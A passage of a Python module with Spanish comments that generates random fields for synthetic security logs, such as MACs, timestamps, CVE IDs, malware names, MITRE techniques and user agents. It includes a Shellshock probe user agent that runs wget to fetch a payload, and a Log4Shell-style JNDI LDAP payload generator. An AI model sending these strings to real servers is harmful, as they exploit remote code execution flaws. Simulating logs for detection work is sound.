    return random.randint(1, 65535) # ID de fragmento IP

def random_arp_type():
    return random.choice(['request', 'reply']) # Tipos ARP

def random_src_mac():
    return ':'.join(f"{random.randint(0, 255):02x}" for _ in range(6))

def random_dst_mac():
    # Incluir MAC de broadcast/multicast
    roll = random.random()
    if roll < 0.05: return 'ff:ff:ff:ff:ff:ff' # Broadcast
    elif roll < 0.10: return f'01:00:5e:{random.randint(0,127):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}' # IPv4 Multicast
    elif roll < 0.15: return f'33:33:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}' # IPv6 Multicast
    else: return ':'.join(f"{random.randint(0, 255):02x}" for _ in range(6)) # Unicast

def random_method():
    # Métodos de acceso/configuración
    return random.choice(['CLI', 'API', 'GUI', 'WebUI', 'SSH', 'Console', 'SNMP', 'NETCONF', 'RESTCONF'])

def random_pc():
    # Program Counter (dirección de memoria)
    return hex(random.randint(0x10000000, 0xFFFFFFFF))

def random_call_stack():
    # Pila de llamadas simulada
    return ' -> '.join([hex(random.randint(0x10000000, 0xFFFFFFFF)) for _ in range(random.randint(3, 7))])

def random_limit():
    # Límites genéricos (rate limit, etc.)
    return random.choice([10, 50, 100, 500, 1000, 5000])

def random_icmp_id():
    return random.randint(1, 65535)  # ID ICMP aleatorio

def random_vlan_id():
    return random.randint(1, 4094)  # ID de VLAN válido

def random_fragment_size():
    return random.randint(64, 1500)  # Tamaño de fragmento en bytes (más realista)

def random_hdr_length():
    # Longitud de cabecera IP/TCP común (en bytes)
    return random.choice([20, 24, 28, 32, 40, 60])

def random_mac_address():
    # Reutilizar random_src_mac o random_dst_mac
    return random_src_mac()

def random_attempts():
    return random.randint(1, 10)  # Número de intentos

def random_connection_id():
    return random.randint(10000, 999999)  # ID de conexión

def random_auth_server_group():
    return random.choice(['LDAP_Servers', 'RADIUS_Group1', 'TACACS+_Prod', 'LOCAL', 'AD_Auth', 'Kerberos_Realm'])  # Grupo de autenticación

def random_duration():
    # Duración en segundos o formato HH:MM:SS
    seconds = random.randint(0, 7200) # Hasta 2 horas
    if random.random() > 0.5:
        return str(seconds)
    else:
        return str(timedelta(seconds=seconds))

def random_group_id():
     # IDs de grupo VRRP/HSRP
    return random.randint(1, 255)

def random_bytes():
    # Número de bytes transferidos
    return random.randint(0, 100000000) # Hasta ~100MB

def random_pkt_length():
    # Longitud del paquete en bytes
    return random.randint(40, 1500)

def random_fragment_offset():
    # Offset de fragmento IP (múltiplo de 8)
    return random.randint(0, 8189) * 8

def random_module():
    # Módulos de sistema/software
    return random.choice(['IPS', 'Firewall', 'VPN', 'Routing', 'Switching', 'Kernel', 'Systemd', 'Apache', 'Nginx', 'Database', 'Authentication', 'Authorization', 'Audit'])

# --- Timestamps Específicos ---
def random_bsd_timestamp():
    """Genera un timestamp estilo BSD (ej: Apr 27 13:38:29)"""
    now = datetime.now() - timedelta(seconds=random.randint(0, 3600))
    return now.strftime('%b %d %H:%M:%S').replace(' 0', '  ') # Ajuste para día < 10

def random_unix_timestamp():
    """Genera un timestamp Unix flotante (ej: 1745674709.123)"""
    return datetime.now().timestamp() - random.uniform(0, 3600)

def random_w3c_datetime():
    """Genera fecha y hora separadas para W3C (ej: 2025-04-27 13:38:29)"""
    now = datetime.now() - timedelta(seconds=random.randint(0, 3600))
    return now.strftime('%Y-%m-%d'), now.strftime('%H:%M:%S') # Devuelve tupla (fecha, hora)

def random_sql_timestamp():
    """Genera timestamp estilo SQL Server ErrorLog (ej: 2025-04-27 13:38:29.12)"""
    now = datetime.now() - timedelta(seconds=random.randint(0, 3600))
    return now.strftime('%Y-%m-%d %H:%M:%S.') + str(random.randint(10, 99))

def random_iso_timestamp():
    """Genera timestamp en formato ISO 8601 UTC (ej: 2025-04-27T17:38:29.123Z)"""
    now = datetime.utcnow() - timedelta(seconds=random.randint(0, 3600))
    # Formato con milisegundos y 'Z'
    return now.strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'

# --- IDs y Nombres Específicos ---
def random_signature_id(min_val=10000, max_val=9999999):
    """Genera un ID de firma/regla genérico numérico."""
    return str(random.randint(min_val, max_val))

def random_cve_id():
    """Genera un ID CVE plausible (no necesariamente válido)."""
    year = random.randint(2018, 2025) # Rango de años más reciente
    num = random.randint(1000, 50000) # Rango aumentado
    return f"CVE-{year}-{num:04d}" # Asegurar padding

def random_threat_name_generic():
    """Genera un nombre de amenaza/malware genérico."""
    prefix = random.choice(['Troj/', 'Mal/', 'Ransom.', 'Exploit.', 'PUA.', 'Worm.', 'APT.', 'Phish/', 'Scan.', 'DoS.', 'Suspicious/', 'Backdoor.', 'Coinminer.', 'Spy.', 'HackTool.', 'Riskware.', 'Joke.'])
    platform = random.choice(['Win32', 'Win64', 'Linux', 'Android', 'OSX', 'Multi', 'JS', 'PS', 'VBS', 'Java', 'Doc'])
    name = random.choice(['Generic', 'Downloader', 'Agent', 'Dropper', 'Injector', 'Banker', 'Keylogger', 'Infostealer', 'Krypt', 'Locky', 'WannaCry', 'Emotet', 'TrickBot', 'Qakbot', 'XMRig', 'Mimikatz', 'CobaltStrike', 'Meterpreter', 'Obfus', 'Packed'])
    suffix = random.choice(['.Gen', '.A', '.B', '.XYZ', f'!{random.randint(1,100)}', '', '.{uid}'.format(uid=uuid.uuid4().hex[:4].upper())])
    return f"{prefix}{platform}/{name}{suffix}"

def random_attack_name_generic():
    """Genera un nombre de ataque genérico."""
    tech = random.choice(['SQL Injection', 'Cross-Site Scripting (XSS)', 'Command Injection', 'Directory Traversal', 'Local File Inclusion (LFI)', 'Remote File Inclusion (RFI)', 'Server-Side Request Forgery (SSRF)', 'XML External Entity (XXE)', 'Buffer Overflow', 'Format String', 'Port Scan (TCP SYN)', 'Host Scan (ICMP)', 'UDP Flood', 'ICMP Flood', 'Slowloris Attack', 'DNS Amplification DDoS', 'Brute Force (SSH)', 'Brute Force (RDP)', 'Brute Force (Web Login)', 'Credential Stuffing', 'Pass-the-Hash', 'Kerberoasting', 'LSASS Memory Access', 'Malware Download Attempt', 'C&C Beaconing', 'Data Exfiltration (HTTP)', 'Ransomware Encryption Activity', 'Process Injection (CreateRemoteThread)', 'DLL Hijacking', 'Phishing Link Clicked', 'Drive-by Compromise', 'Watering Hole Attack', 'Man-in-the-Middle (ARP Spoofing)', 'Session Hijacking'])
    suffix = random.choice([' Attempt', ' Detected', ' Prevented', ' Blocked', ' Mitigation Triggered', ' Alert'])
    return f"{tech}{suffix}"

def random_guid():
    """Genera un GUID aleatorio."""
    return str(uuid.uuid4())

def random_log_id_cp():
    """Genera un ID de log aleatorio (formato Check Point)."""
    # Formato simplificado para ejemplo
    return "{{0x{0:08x}}}".format(random.randint(0, 0xFFFFFFFF)) # Padding a 8 hex

def random_sid():
    """Genera un SID de Windows de ejemplo."""
    rid = random.choice([500, 501, 1000, 1001, 1101, 1102]) # RIDs comunes
    sub_auth_count = random.randint(3, 5) # Número de subautoridades
    sub_authorities = [str(random.randint(100000000, 4294967295)) for _ in range(sub_auth_count)]
    domain_identifier = '-'.join(sub_authorities)
    # Common integrity levels/capabilities as RIDs
    special_rid = random.choice(['', f'-{rid}', '-544', '-545', '-512', '-1101']) # Builtin Admins, Users, Domain Admins, Domain Users etc.
    return f"S-1-5-21-{domain_identifier}{special_rid}"

def random_process_id():
    """Genera un ID de proceso (PID) común."""
    return random.randint(100, 65535) # PID 0, 1, 4 son especiales usualmente

def random_app_name():
    """Genera un nombre de aplicación común."""
    # Nombres de procesos más comunes
    return random.choice(['chrome.exe', 'firefox.exe', 'OUTLOOK.EXE', 'Teams.exe', 'Zoom.exe', 'AnyDesk.exe', 'Notepad++.exe', 'WinSCP.exe', 'putty.exe', 'Tor Browser\\firefox.exe', 'qbittorrent.exe', 'Skype.exe', 'powershell.exe', 'cmd.exe', 'explorer.exe', 'svchost.exe', 'lsass.exe', 'winword.exe', 'excel.exe', 'AcroRd32.exe', 'javaw.exe', 'rundll32.exe', 'spoolsv.exe', 'msedge.exe', 'Code.exe', 'RuntimeBroker.exe', 'dwm.exe', 'ctfmon.exe', 'SearchIndexer.exe'])

def random_service_name_os():
    """Genera un nombre de servicio de OS."""
    # Nombres de servicios comunes (Windows y Linux/systemd)
    return random.choice(['WinRM', 'Spooler', 'BITS', 'WinDefend', 'MsMpEng', 'TermService', 'Schedule', 'SamSs', 'Netlogon', 'Dnscache', 'Dhcp', 'CryptSvc', 'AudioSrv', 'ssh', 'sshd', 'httpd', 'apache2', 'nginx', 'kdc', 'slapd', 'auditd', 'nfs-server', 'rpcbind', 'crond', 'systemd-journald', 'NetworkManager', 'firewalld', 'ufw', 'docker', 'postgresql', 'mysql'])

def random_realm():
    """Genera un nombre de realm Kerberos/IPA plausible."""
    domain = random.choice(['CORP', 'AD', 'IPA', 'INTERNAL', 'GLOBAL', 'LAB', 'DEV'])
    tld = random.choice(['LOCAL', 'COM', 'NET', 'ORG', 'IO'])
    return f"{domain}.{tld}"

def random_dn():
    """Genera un Distinguished Name (DN) LDAP/AD de ejemplo."""
    ou_list = ['Users', 'Computers', 'Groups', 'Servers', 'ServiceAccounts', 'DisabledObjects', 'Domain Controllers', 'Printers', 'Security Groups', 'Distribution Lists', 'Resources', 'Test OU']
    ou_path = ','.join(f"OU={ou}" for ou in random.sample(ou_list, random.randint(1, 4)))
    dc_parts = random.choice(['corp.local', 'ad.example.com', 'internal.company.net', 'lab.dev.org']).split('.')
    dc_path = ','.join(f"DC={dc}" for dc in dc_parts)
    common_names = ['Administrator', 'j.doe', 'asmith', 'srv01$', 'SQLServiceAccount', 'BackupAdmins', 'krbtgt', 'HelpDeskUser', 'WebAppPool', 'Computer-WKS01', 'Printer-Floor3', 'AllStaff-DL']
    name = random.choice(common_names)
    return f"CN={name},{ou_path},{dc_path}"

# --- Hashes Específicos ---
def random_sha1():
    """Genera un hash SHA1 aleatorio (40 hex chars)."""
    return ''.join(random.choice(string.hexdigits.lower()) for _ in range(40))

def random_sha256():
    """Genera un hash SHA256 aleatorio (64 hex chars)."""
    return ''.join(random.choice(string.hexdigits.lower()) for _ in range(64))

def random_md5():
    """Genera un hash MD5 aleatorio (32 hex chars)."""
    return ''.join(random.choice(string.hexdigits.lower()) for _ in range(32))

# --- HTTP Específicos ---
def random_http_method():
    """Genera un método HTTP."""
    # Lista ampliada, puede reemplazar tu random_method si se usaba para esto
    return random.choice(['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'CONNECT', 'PATCH', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK', 'SEARCH', 'REPORT', 'MKACTIVITY', 'CHECKOUT', 'MERGE'])

def random_http_status_code(type='any'):
    """Genera un código de estado HTTP (cliente/servidor/cualquiera)."""
    # Puede reemplazar tu random_status si se usaba para esto
    client_error = [400, 401, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 421, 422, 423, 424, 426, 428, 429, 431, 451]
    server_error = [500, 501, 502, 503, 504, 505, 506, 507, 508, 510, 511]
    success_info_redir = [100, 101, 200, 201, 202, 204, 206, 300, 301, 302, 304, 307, 308]
    if type == 'client_error': return random.choice(client_error)
    elif type == 'server_error': return random.choice(server_error)
    elif type == 'success': return random.choice([s for s in success_info_redir if 200 <= s < 300])
    elif type == 'redirect': return random.choice([s for s in success_info_redir if 300 <= s < 400])
    else: return random.choice(client_error + server_error + success_info_redir)

def random_user_agent_string():
    """Genera un User-Agent plausible (navegador, bot, scanner, app)."""
    # Lista más extensa y realista
    return random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
        'curl/7.86.0',
        'python-requests/2.28.1',
        'Nmap Scripting Engine; https://nmap.org/book/nse.html',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
        '() {{ :;}}; /bin/bash -c "wget http://{domain}/payload"'.format(domain=random_domain()), # Shellshock probe
        'Mozilla/5.0 Jorgee', # Simple scanner UA
        'sqlmap/1.7.2#stable (https://sqlmap.org)', # SQLMap UA
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', # IE11
        'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SQ1D.211205.017)', # Android App UA
        'MyApp/1.2.3 (com.example.myapp; build:101; iOS 15.5.0) Alamofire/5.6.2', # iOS App UA
        'Wget/1.21.3 (linux-gnu)',
        'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
        'masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)'
    ])

# --- Seguridad Específicos ---
def random_action_taken():
    """Genera una acción de seguridad común."""
    # Lista ampliada de acciones
    return random.choice(['Allowed', 'Blocked', 'Detected', 'Prevented', 'Quarantined', 'Cleaned', 'Dropped', 'Rejected', 'Alert', 'Warn', 'Logged', 'Denied', 'Permitted', 'Reset', 'Encrypted', 'Decrypted', 'Released From Quarantine', 'Restored From Backup', 'UserAllowed', 'Pending Analysis', 'Failed', 'Success', 'Bypassed', 'Marked Benign', 'Isolated Host', 'Terminated Process', 'Deleted File', 'Connection Terminated', 'Rate Limited', 'Challenged (MFA)', 'Redirected to Captive Portal', 'Monitor', 'Audit Success', 'Audit Failure'])

def random_mitre_tactic():
    """Genera un nombre de táctica MITRE ATT&CK."""
    # Tácticas de Enterprise ATT&CK v12
    return random.choice([
        'Reconnaissance', 'Resource Development', 'Initial Access', 'Execution',
        'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access',
        'Discovery', 'Lateral Movement', 'Collection', 'Command and Control',
        'Exfiltration', 'Impact'
    ])

def random_mitre_technique(tactic=None):
    """Genera un nombre de técnica MITRE ATT&CK (parcial, ejemplo)."""
    # Lista de ejemplo de técnicas y sub-técnicas comunes
    techniques = [
        'T1586.003: Phishing: Spearphishing Link', 'T1190: Exploit Public-Facing Application', 'T1059.001: PowerShell', 'T1059.004: Command and Scripting Interpreter: Unix Shell', 'T1547.001: Registry Run Keys / Startup Folder', 'T1053.005: Scheduled Task/Job: Scheduled Task', 'T1055.001: Process Injection: DLL Injection', 'T1003.001: OS Credential Dumping: LSASS Memory', 'T1562.001: Impair Defenses: Disable or Modify Tools', 'T1110.003: Brute Force: Password Spraying', 'T1046: Network Service Scanning', 'T1210: Exploitation of Remote Services', 'T1021.001: Remote Services: RDP', 'T1021.002: Remote Services: SMB/Windows Admin Shares', 'T1486: Data Encrypted for Impact', 'T1496: Resource Hijacking', 'T1071.001: Application Layer Protocol: Web Protocols', 'T1071.004: Application Layer Protocol: DNS', 'T1573.002: Dynamic Resolution: Domain Generation Algorithms', 'T1105: Ingress Tool Transfer', 'T1574.002: Signed Binary Proxy Execution: Rundll32', 'T1047: Windows Management Instrumentation (WMI)', 'T1136.001: Create Account: Local Account', 'T1222.002: File and Directory Permissions Modification: Unix File and Directory Permissions Modification', 'T1564.001: Hide Artifacts: Hidden Files and Directories', 'T1070.004: Indicator Removal on Host: File Deletion', 'T1112: Modify Registry', 'T1218.005: System Binary Proxy Execution: Mshta', 'T1087.001: Account Discovery: Local Account', 'T1057: Process Discovery', 'T1049: System Network Connections Discovery', 'T1018: Remote System Discovery', 'T1033: System Owner/User Discovery', 'T1560.001: Archive Collected Data: Archive via Utility', 'T1041: Exfiltration Over C2 Channel', 'T1567.002: Exfiltration Over Web Service: Exfiltration to Cloud Storage', 'T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol', 'T1490: Inhibit System Recovery', 'T1489: Service Stop', 'T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting', 'T1552.001: Credentials from Password Stores: Keychain', 'T1555.003: Credentials from Password Stores: Credentials from Web Browsers'
    ]
    # Aquí se podría añadir lógica para filtrar por táctica si se proporciona
    return random.choice(techniques)

def random_mfa_factor():
    """Genera un tipo de factor MFA."""
    # Factores MFA comunes
    return random.choice(['Password', 'Okta Verify Push', 'Okta Verify OTP', 'Google Authenticator', 'Microsoft Authenticator', 'SMS Passcode', 'Security Question', 'FIDO2 Security Key (WebAuthn)', 'U2F Security Key', 'Biometric (Fingerprint/FaceID)', 'Phone Call Verification', 'DUO Push', 'YubiKey OTP', 'Email Link Verification', 'Hardware TOTP Token', 'Software TOTP Token'])

def random_auth_result_detail():
    """Genera un resultado de autenticación detallado."""
    # Resultados de autenticación más comunes y específicos
    return random.choice(['SUCCESS', 'FAILURE_INVALID_CREDENTIALS', 'ACCOUNT_LOCKED', 'MFA_REQUIRED', 'MFA_VERIFIED', 'MFA_DENIED_USER', 'MFA_INVALID_FACTOR', 'MFA_TIMEOUT', 'MFA_FRAUD_REPORTED', 'UNTRUSTED_DEVICE', 'POLICY_DENIAL_RISK_HIGH', 'POLICY_DENIAL_GEO_BLOCK', 'PASSWORD_EXPIRED', 'ACCOUNT_DISABLED', 'GEO_VELOCITY_ANOMALY_DETECTED', 'UNKNOWN_USER_ACCOUNT', 'RATE_LIMIT_EXCEEDED', 'AUTH_SERVER_ERROR', 'CONNECTION_FAILED_TO_IDP', 'BYPASS_CODE_USED', 'SUCCESS_REMEMBER_DEVICE_ENABLED', 'NEW_DEVICE_LOGIN_DETECTED', 'PASSWORD_RESET_SUCCESS', 'ACCOUNT_CREATED', 'ACCOUNT_DELETED', 'SERVICE_TICKET_VALIDATED', 'TGT_ISSUED'])

def random_country_code():
    """Genera un código ISO de país de 2 letras plausible."""
    # Lista de códigos de países comunes (incluyendo algunos más usados en ciberseguridad)
    return random.choice(["US", "CA", "MX", "GB", "DE", "FR", "NL", "CN", "RU", "IN", "BR", "AU", "JP", "KR", "SG", "ES", "IT", "PL", "UA", "TR", "IR", "NG", "ZA", "AR", "VN", "ID", "PH", "PK", "RO", "CZ", "HU", "BE", "SE", "CH", "AT", "IE", "IL", "AE", "SA", "EG", "CO", "CL", "TH", "MY", "HK", "TW", "ZZ"]) # ZZ=Unknown/Invalid

# --- Misceláneos ---
def random_numeric_id(digits=8):
    """Genera un ID numérico simple como string."""
    if digits <= 0: return ''
    min_val = 10**(digits-1) if digits > 1 else 0
    max_val = (10**digits)-1
    return str(random.randint(min_val, max_val))
def random_action():
    """Genera una acción aleatoria."""
    return random.choice([
        "alert_possible_takeover", "alert_security", "block", "block_internal_ip",
        "deny", "extraction_blocked", "rate_limit", "reject_incomplete", "scope_reduction"
    ])

def random_allowed_scope():
    """Genera un alcance permitido aleatorio."""
    return random.choice(["read-only", "read-write", "admin"])

def random_api_gateway_hostname():
    """Genera un nombre de host para un API Gateway."""
    return f"api-gateway-{random.randint(1, 100)}.example.com"

def random_attack_type():
    """Genera un tipo de ataque aleatorio."""
    return random.choice(["SQL Injection", "XSS", "DDoS", "Brute Force", "CSRF", "RCE"])

def random_auth_header():
    """Genera un encabezado de autenticación básico."""
    return "Basic " + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

def random_auth_user():
    """Genera un nombre de usuario de autenticación."""
    return random.choice(["admin", "user", "guest", "test_user"])

def random_auth_pass():
    """Genera una contraseña aleatoria."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

def random_bsd_timestamp():
    """Genera un timestamp estilo BSD."""
    now = datetime.now() - timedelta(seconds=random.randint(0, 3600))
    return now.strftime('%b %d %H:%M:%S').replace(' 0', '  ')

def random_client_id_api():
    """Genera un ID de cliente para una API."""
    return f"client-{random.randint(1, 1000)}"

def random_comparison():
    """Genera un operador de comparación."""
    return random.choice(["equals", "not_equals", "contains", "starts_with", "ends_with"])

def random_concurrent_requests():
    """Genera un número aleatorio de solicitudes concurrentes."""
    return random.randint(1, 100)

def random_decoded_payload():
    """Genera un payload decodificado."""
    return '{"key": "value"}'

def random_endpoint():
    """Genera un endpoint de API."""
    return f"/api/v1/resource/{random.randint(1, 100)}"

def random_error_pattern():
    """Genera un patrón de error."""
    return ".*Error.*"

def random_expected_host_web():
    """Genera un nombre de host esperado para la web."""
    return f"host-{random.randint(1, 100)}.example.com"

def random_failed_decrypt_attempts():
    """Genera un número aleatorio de intentos fallidos de descifrado."""
    return random.randint(1, 10)

def random_fields_detected():
    """Genera una lista de campos detectados."""
    return random.choice(["username,password", "email,phone", "id,name"])

def random_hash_compared_to():
    """Genera un hash para comparación."""
    return ''.join(random.choices(string.hexdigits.lower(), k=64))

def random_headers():
    """Genera un encabezado HTTP."""
    return '{"Content-Type": "application/json"}'

def random_http_header_soapaction():
    """Genera un encabezado HTTP SOAPAction."""
    return "action-name"

def random_input_data():
    """Genera datos de entrada."""
    return '{"input": "value"}'

def random_jndi_payload():
    """Genera un payload JNDI malicioso."""
    return f"jndi:ldap://{random_ip(type='external')}:1389/a"

def random_origin_header():
    """Genera un encabezado de origen."""
    return "https://example.com"

def random_parameter_payload():
    """Genera un payload de parámetro."""
    return '{"param": "value"}'

def random_password_placeholder():
    """Genera un marcador de posición para contraseñas."""
    return "********"

def random_payload():
    """Genera un payload genérico."""
    return '{"key": "value"}'

def random_payload_contains():
    """Genera un contenido de payload."""
    return "sensitive_data"

def random_post_param_count():
    """Genera un número aleatorio de parámetros POST."""
    return random.randint(1, 10)

def random_processing_time():
    """Genera un tiempo de procesamiento aleatorio."""
    return f"{random.uniform(0.1, 5.0):.2f}s"

def random_redirect_uri():
    """Genera un URI de redirección."""
    return "https://example.com/callback"

def random_response_header():
    """Genera un encabezado de respuesta."""
    return '{"Content-Type": "application/json"}'

def random_response_size():
    """Genera un tamaño de respuesta aleatorio."""
    return random.randint(100, 10000)

def random_result():
    """Genera un resultado genérico."""
    return random.choice(["success", "failure", "pending"])

def random_rule_id():
    """Genera un ID de regla."""
    return random.randint(1, 1000)

def random_saml_assertion_id():
    """Genera un ID de aserción SAML."""
    return f"assertion-{random.randint(1, 1000)}"

def random_script_name_web():
    """Genera un nombre de script web."""
    return f"/scripts/script-{random.randint(1, 100)}.js"

def random_signature_status():
    """Genera un estado de firma."""
    return random.choice(["Valid", "Invalid"])

def random_state():
    """Genera un estado genérico."""
    return random.choice(["active", "inactive", "pending"])

def random_target_sp_api():
    """Genera un nombre de proveedor de servicios objetivo."""
    return "service-provider"

def random_uri():
    """Genera un URI genérico."""
    return f"/api/resource/{random.randint(1, 100)}"

def random_user_agent():
    """Genera un User-Agent genérico."""
    return "Mozilla/5.0"

def random_username_api():
    """Genera un nombre de usuario para API."""
    return f"api_user_{random.randint(1, 100)}"

def random_viewstate_payload():
    """Genera un payload de ViewState."""
    return "viewstate_data"

def random_voucher_code():
    """Genera un código de voucher."""
    return f"DISCOUNT-{random.randint(1000, 9999)}"

def random_zip_entry_name():
    """Genera un nombre de entrada ZIP."""
    return f"entry-{random.randint(1, 100)}.zip"